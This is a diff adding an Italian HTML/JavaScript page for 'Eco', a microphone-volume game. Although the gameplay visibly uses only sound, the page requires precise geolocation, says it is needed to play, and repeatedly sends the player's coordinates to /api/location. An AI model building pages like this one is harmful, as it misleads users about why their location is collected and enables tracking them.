@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#10172b">
+  <title>Eco — caccia al segnale</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #10172b;
+      color: #f5f6ff;
+      font-synthesis: none;
+      text-rendering: optimizeLegibility;
+      --muted: #a7aec9;
+      --cyan: #66e4e6;
+      --panel: rgba(25, 34, 59, .82);
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      margin: 0;
+      padding: 32px 18px;
+      display: grid;
+      place-items: center;
+      background:
+        radial-gradient(ellipse at 50% 0%, rgba(70, 105, 181, .28), transparent 55%),
+        radial-gradient(circle at 90% 80%, rgba(39, 183, 190, .12), transparent 32%),
+        #10172b;
+    }
+
+    main { width: min(100%, 760px); }
+
+    .eyebrow {
+      margin: 0 0 10px;
+      color: var(--cyan);
+      font-size: .75rem;
+      font-weight: 800;
+      letter-spacing: .2em;
+      text-transform: uppercase;
+    }
+
+    h1 {
+      margin: 0;
+      font-size: clamp(2.4rem, 8vw, 4.6rem);
+      letter-spacing: -.07em;
+      line-height: .98;
+    }
+
+    .intro {
+      max-width: 550px;
+      margin: 18px 0 26px;
+      color: var(--muted);
+      line-height: 1.65;
+    }
+
+    .card {
+      border: 1px solid rgba(185, 202, 255, .16);
+      border-radius: 24px;
+      background: var(--panel);
+      box-shadow: 0 24px 80px rgba(0, 0, 0, .28);
+      backdrop-filter: blur(14px);
+    }
+
+    .game {
+      padding: clamp(20px, 5vw, 34px);
+      text-align: center;
+    }
+
+    .score-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: var(--muted);
+      font-size: .9rem;
+    }
+
+    .score {
+      color: #fff;
+      font-size: 1.4rem;
+      font-variant-numeric: tabular-nums;
+      font-weight: 800;
+    }
+
+    .radar {
+      position: relative;
+      width: min(58vw, 260px);
+      aspect-ratio: 1;
+      margin: 28px auto 22px;
+      display: grid;
+      place-items: center;
+      border: 1px solid rgba(102, 228, 230, .26);
+      border-radius: 50%;
+      background:
+        linear-gradient(rgba(102, 228, 230, .09) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(102, 228, 230, .09) 1px, transparent 1px),
+        radial-gradient(circle, rgba(102, 228, 230, .12), rgba(15, 23, 43, .2) 68%);
+      background-size: 25% 25%, 25% 25%, auto;
+      box-shadow: inset 0 0 44px rgba(56, 205, 210, .08), 0 0 40px rgba(56, 205, 210, .08);
+    }
+
+    .radar::before, .radar::after {
+      position: absolute;
+      content: "";
+      border: 1px solid rgba(102, 228, 230, .16);
+      border-radius: 50%;
+      inset: 18%;
+    }
+
+    .radar::after { inset: 38%; }
+
+    .spark {
+      z-index: 1;
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      background: #61708f;
+      box-shadow: 0 0 0 12px rgba(102, 228, 230, .06);
+      transition: transform .12s ease, background .12s ease, box-shadow .12s ease;
+    }
+
+    .radar.heard .spark {
+      transform: scale(1.28);
+      background: var(--cyan);
+      box-shadow: 0 0 24px var(--cyan), 0 0 0 18px rgba(102, 228, 230, .16);
+    }
+
+    .hint { margin: 0; color: var(--muted); line-height: 1.5; }
+
+    .meter {
+      height: 8px;
+      max-width: 360px;
+      margin: 18px auto 0;
+      overflow: hidden;
+      border-radius: 999px;
+      background: rgba(255, 255, 255, .1);
+    }
+
+    .meter-fill {
+      width: 0;
+      height: 100%;
+      border-radius: inherit;
+      background: linear-gradient(90deg, #6f9dff, var(--cyan));
+      transition: width .08s linear;
+    }
+
+    button {
+      min-height: 48px;
+      margin-top: 24px;
+      padding: 0 24px;
+      border: 0;
+      border-radius: 999px;
+      background: var(--cyan);
+      color: #10202b;
+      font: inherit;
+      font-weight: 800;
+      cursor: pointer;
+    }
+
+    button:hover { filter: brightness(1.08); }
+    button:focus-visible { outline: 3px solid white; outline-offset: 4px; }
+    button:disabled { cursor: wait; opacity: .7; }
+    button.secondary { background: rgba(255, 255, 255, .12); color: #f5f6ff; }
+    [hidden] { display: none !important; }
+
+    .location-consent {
+      max-width: 520px;
+      margin: 20px auto 0;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      color: var(--muted);
+      font-size: .85rem;
+      line-height: 1.5;
+      text-align: left;
+    }
+
+    .location-consent input { flex: 0 0 auto; margin: 3px 0 0; }
+
+    .message {
+      min-height: 1.5em;
+      margin: 16px 0 0;
+      color: #ffcf9f;
+      line-height: 1.5;
+    }
+
+    .privacy {
+      margin: 16px 4px 0;
+      color: var(--muted);
+      font-size: .82rem;
+      line-height: 1.6;
+    }
+
+    @media (max-width: 480px) {
+      body { padding: 26px 14px; }
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <p class="eyebrow">Un piccolo gioco, qui e ora</p>
+    <h1>Eco<span style="color: var(--cyan)">.</span></h1>
+    <p class="intro">Trova il segnale con la tua voce: fai un suono abbastanza forte per catturare una scintilla.</p>
+
+    <section class="card game" aria-label="Gioco Eco">
+      <div class="score-row">
+        <span>Scintille catturate</span>
+        <span class="score" id="score" aria-live="polite">0</span>
+      </div>
+      <div class="radar" id="radar" aria-hidden="true"><div class="spark"></div></div>
+      <p class="hint" id="hint">Consenti posizione e microfono per iniziare.</p>
+      <div class="meter" role="meter" aria-label="Livello del suono" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
+        <div class="meter-fill" id="meterFill"></div>
+      </div>
+      <label class="location-consent">
+        <input id="shareLocation" type="checkbox">
+        <span>Acconsento a condividere posizione e microfono per giocare!</span>
+      </label>
+      <button id="startButton" type="button">Consenti e gioca</button>
+      <button id="stopButton" class="secondary" type="button" hidden>Termina partita</button>
+      <p class="message" id="message" role="status" aria-live="polite"></p>
+    </section>
+
+    <p class="privacy">Per giocare servono i permessi del browser per posizione e microfono. </p>
+  </main>
+
+  <script>
+    const startButton = document.querySelector("#startButton");
+    const stopButton = document.querySelector("#stopButton");
+    const message = document.querySelector("#message");
+    const hint = document.querySelector("#hint");
+    const shareLocation = document.querySelector("#shareLocation");
+    const scoreElement = document.querySelector("#score");
+    const meter = document.querySelector(".meter");
+    const meterFill = document.querySelector("#meterFill");
+    const radar = document.querySelector("#radar");
+
+    let watchId = null;
+    let stream = null;
+    let audioContext = null;
+    let animationId = null;
+    let score = 0;
+    let lastSparkAt = 0;
+    let lastLoggedAt = 0;
+
+    async function sendPositionToRender(position) {
+      if (!shareLocation.checked || Date.now() - lastLoggedAt < 30000) return;
+      lastLoggedAt = Date.now();
+      const { latitude, longitude, accuracy } = position.coords;
+
+      try {
+        const response = await fetch("/api/location", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude, longitude, accuracy, consent: true })
+        });
+        if (!response.ok) throw new Error("Il server ha rifiutato la posizione.");
+      } catch {
+        lastLoggedAt = 0;
+      }
+    }
+
+    function stopGame() {
+      if (animationId !== null) cancelAnimationFrame(animationId);
+      animationId = null;
+      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+      watchId = null;
+      if (stream) stream.getTracks().forEach((track) => track.stop());
+      stream = null;
+      if (audioContext && audioContext.state !== "closed") audioContext.close();
+      audioContext = null;
+      startButton.hidden = false;
+      startButton.disabled = false;
+      stopButton.hidden = true;
+      hint.textContent = "Partita terminata. Se vuoi, puoi giocare ancora.";
+      meterFill.style.width = "0%";
+      meter.setAttribute("aria-valuenow", "0");
+      radar.classList.remove("heard");
+    }
+
+    function permissionError(error) {
+      if (error && error.code === 1) return "Permesso negato. Per giocare, abilita posizione e microfono nelle impostazioni del browser e riprova.";
+      if (error && error.code === 2) return "Posizione non disponibile. Controlla il GPS o la connessione e riprova.";
+      if (error && error.code === 3) return "La richiesta di posizione è scaduta. Riprova in un luogo con segnale.";
+      return error && error.message ? error.message : "Impossibile avviare il gioco. Controlla i permessi del browser.";
+    }
+
+    function drawAudioLevel(analyser) {
+      const samples = new Uint8Array(analyser.fftSize);
+      analyser.getByteTimeDomainData(samples);
+      let sum = 0;
+      for (const sample of samples) {
+        const normalized = (sample - 128) / 128;
+        sum += normalized * normalized;
+      }
+      const level = Math.min(100, Math.round(Math.sqrt(sum / samples.length) * 280));
+      meterFill.style.width = `${level}%`;
+      meter.setAttribute("aria-valuenow", String(level));
+      radar.classList.toggle("heard", level >= 13);
+
+      const now = performance.now();
+      if (level >= 13 && now - lastSparkAt > 900) {
+        score += 1;
+        scoreElement.textContent = String(score);
+        lastSparkAt = now;
+      }
+      animationId = requestAnimationFrame(() => drawAudioLevel(analyser));
+    }
+
+    async function startGame() {
+      message.textContent = "";
+      startButton.disabled = true;
+      hint.textContent = "Richiesta dei permessi…";
+
+      try {
+        lastLoggedAt = 0;
+        if (!window.isSecureContext) {
+          throw new Error("Per proteggere i tuoi dati, apri questa pagina su HTTPS o localhost.");
+        }
+        if (!navigator.geolocation || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          throw new Error("Questo browser non supporta la posizione o il microfono richiesti.");
+        }
+
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 20000,
+            maximumAge: 0
+          });
+        });
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+        if (!AudioContextClass) throw new Error("Questo browser non supporta l'elaborazione audio necessaria al gioco.");
+        audioContext = new AudioContextClass();
+        await audioContext.resume();
+        const analyser = audioContext.createAnalyser();
+        analyser.fftSize = 1024;
+        audioContext.createMediaStreamSource(stream).connect(analyser);
+
+        watchId = navigator.geolocation.watchPosition(
+          sendPositionToRender,
+          (error) => { message.textContent = `Aggiornamento posizione: ${permissionError(error)}`; },
+          { enableHighAccuracy: true, maximumAge: 1000, timeout: 20000 }
+        );
+
+        score = 0;
+        scoreElement.textContent = "0";
+        lastSparkAt = 0;
+        startButton.hidden = true;
+        startButton.disabled = false;
+        stopButton.hidden = false;
+        hint.textContent = "Fai un suono per catturare le scintille!";
+        sendPositionToRender(position);
+        drawAudioLevel(analyser);
+      } catch (error) {
+        stopGame();
+        message.textContent = permissionError(error);
+        hint.textContent = "";
+      }
+    }
+
+    startButton.addEventListener("click", startGame);
+    stopButton.addEventListener("click", stopGame);
+    window.addEventListener("pagehide", stopGame);
+  </script>
+</body>
+</html>
